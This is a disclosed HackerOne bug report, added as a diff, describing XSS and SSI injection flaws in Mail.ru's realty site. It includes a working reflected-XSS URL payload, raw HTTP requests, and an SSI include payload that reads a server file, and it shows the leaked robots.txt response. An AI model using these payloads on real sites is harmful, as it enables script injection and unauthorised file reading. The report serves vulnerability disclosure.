@@ -1,0 +1,51 @@
+ReportLink:https://hackerone.com/reports/159985
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:06.10.2016 12:23:27
+
+Summary:
+
+XSS
+===
+**PoC**
+Открыть с помощью **Internet Explorer**
+```
+https://blackfan.ru/x?r=https://realty.mail.ru/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e
+```
+**Request**
+```
+GET /"--><svg/onload=alert(document.domain)>/.. HTTP/1.1
+Host: realty.mail.ru
+Connection: close
+``` 
+
+SSI Injection
+===
+**PoC**
+Request-URI также попадает в SSI код
+```
+GET //#"--><!--#include file="robots.txt"--> HTTP/1.1
+Host: realty.mail.ru
+Connection: close
+```
+
+**Response**
+```
+<link rel="alternate" type="application/rss+xml" title="Недвижимость Mail.Ru" href="https://realty.mail.ru/rss/"/><script type="application/ld+json">
+						{
+							"@context": "http://schema.org",
+							"@type": "WebPage",
+							"headline": "404 - К сожалению, такой страницы нет на сайте",
+							"url": "https://realty.mail.ru/#"-->User-Agent: *
+Allow: /static-remont/remont/xml/
+Disallow: /searching/
+Disallow: /search/
+Disallow: /srch/
+Disallow: /searchfor/
+Disallow: /detail/ru-mos
+Disallow: /detail/foreign
+```
